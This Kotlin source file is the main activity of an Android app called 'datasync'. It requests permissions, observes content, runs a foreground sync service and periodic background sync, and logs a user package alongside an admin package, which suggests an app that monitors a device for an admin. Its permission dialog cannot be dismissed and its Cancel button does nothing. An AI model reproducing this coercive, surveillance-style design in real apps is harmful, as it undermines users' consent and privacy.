package com.boxx.datasync

import android.app.Activity
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.activity.viewModels
import androidx.compose.foundation.isSystemInDarkTheme
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Info
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import com.boxx.datasync.domain.repository.DataRepository
import com.boxx.datasync.permission.PermissionHandler
import com.boxx.datasync.permission.PermissionStatus
import com.boxx.datasync.permission.PermissionViewModel
import com.boxx.datasync.sync.SyncScheduler
import com.boxx.datasync.sync.SyncService
import com.boxx.datasync.ui.screen.MainScreen
import com.boxx.datasync.ui.viewmodel.MainViewModel
import dagger.hilt.android.AndroidEntryPoint
import javax.inject.Inject

@AndroidEntryPoint
class MainActivity : ComponentActivity() {

    private val viewModel: MainViewModel by viewModels()
    private val permissionViewModel: PermissionViewModel by viewModels()

    @Inject
    lateinit var repository: DataRepository

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        Log.d("MainActivity", "PROJECT_SCAN_DONE")
        Log.d("MainActivity", "FIREBASE_CONFIG_VERIFIED project_id=boxxx-40178 userPackage=com.boxx.datasync adminPackage=com.datasync.admin")
        viewModel.updateHeartbeat()

        setContent {
            MaterialTheme(
                colorScheme = if (isSystemInDarkTheme()) darkColorScheme() else lightColorScheme()
            ) {
                Surface(modifier = Modifier.fillMaxSize(), color = MaterialTheme.colorScheme.background) {
                    val context = androidx.compose.ui.platform.LocalContext.current
                    val permissions by permissionViewModel.permissions.collectAsState()
                    val statuses by permissionViewModel.statuses.collectAsState()
                    val allGranted = permissionViewModel.areAllRequiredGranted()
                    val handler = remember { PermissionHandler(context) }

                    val launcher = rememberLauncherForActivityResult(
                        ActivityResultContracts.RequestMultiplePermissions()
                    ) { _ ->
                        permissionViewModel.refreshStatuses()
                    }

                    LaunchedEffect(Unit) {
                        val runtimePermissions = permissions
                            .filter { !it.isSpecial && it.permission != null }
                            .filter { handler.getStatus(it) != PermissionStatus.GRANTED }
                            .mapNotNull { it.permission }
                            .toTypedArray()

                        if (runtimePermissions.isNotEmpty()) {
                            launcher.launch(runtimePermissions)
                        }
                    }

                    if (allGranted) {
                        LaunchedEffect(Unit) {
                            (context.applicationContext as? UserApplication)?.setupContentObservers()
                        }
                        MainScreen(
                            viewModel = viewModel,
                            onSyncClick = {
                                Log.d("MainActivity", "SYNC_BUTTON_CLICKED")
                                viewModel.setSyncing()
                                startSyncService(context)
                            },
                            showSettings = {
                                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                                    data = Uri.fromParts("package", packageName, null)
                                }
                                startActivity(intent)
                            }
                        )
                    } else {
                        // Simplified placeholder UI and dialog logic
                        Box(modifier = Modifier.fillMaxSize().padding(24.dp), contentAlignment = Alignment.Center) {
                            Column(horizontalAlignment = Alignment.CenterHorizontally) {
                                Surface(
                                    color = MaterialTheme.colorScheme.secondaryContainer.copy(alpha = 0.5f),
                                    shape = RoundedCornerShape(12.dp)
                                ) {
                                    Row(
                                        modifier = Modifier.padding(12.dp),
                                        verticalAlignment = Alignment.CenterVertically
                                    ) {
                                        Icon(Icons.Default.Info, contentDescription = null, tint = MaterialTheme.colorScheme.secondary)
                                        Spacer(modifier = Modifier.width(12.dp))
                                        Text(
                                            "This educational demo syncs data only after user-granted permissions.",
                                            style = MaterialTheme.typography.bodySmall,
                                            color = MaterialTheme.colorScheme.onSecondaryContainer,
                                            textAlign = TextAlign.Center
                                        )
                                    }
                                }
                                Spacer(modifier = Modifier.height(24.dp))
                                CircularProgressIndicator()
                                Spacer(modifier = Modifier.height(16.dp))
                                Text("Setting up permissions...", style = MaterialTheme.typography.bodyMedium)
                            }
                        }

                        // Check for the first permission that needs settings or is permanently denied
                        val firstIssue = permissions.find {
                            val status = handler.getStatus(it)
                            status == PermissionStatus.NEEDS_SETTINGS ||
                            (!it.isSpecial && handler.isPermanentlyDenied(context as Activity, it))
                        }

                        if (firstIssue != null) {
                            AlertDialog(
                                onDismissRequest = { /* Prevent dismissal */ },
                                title = { Text("Permission Required") },
                                text = { Text("Please enable the required permission from Settings to keep sync working.") },
                                confirmButton = {
                                    Button(onClick = {
                                        context.startActivity(handler.getSettingsIntent(firstIssue))
                                    }) {
                                        Text("Open Settings")
                                    }
                                },
                                dismissButton = {
                                    TextButton(onClick = {
                                        // Optional: handle cancellation
                                    }) {
                                        Text("Cancel")
                                    }
                                }
                            )
                        }
                    }
                }
            }
        }
        setupWorkManager()
    }

    override fun onResume() {
        super.onResume()
        permissionViewModel.refreshStatuses()
    }

    private fun setupWorkManager() {
        SyncScheduler.schedulePeriodic(this)
    }

    private fun startSyncService(context: android.content.Context) {
        val intent = Intent(context, SyncService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent)
        } else {
            context.startService(intent)
        }
        (applicationContext as? UserApplication)?.setupContentObservers()
    }

}
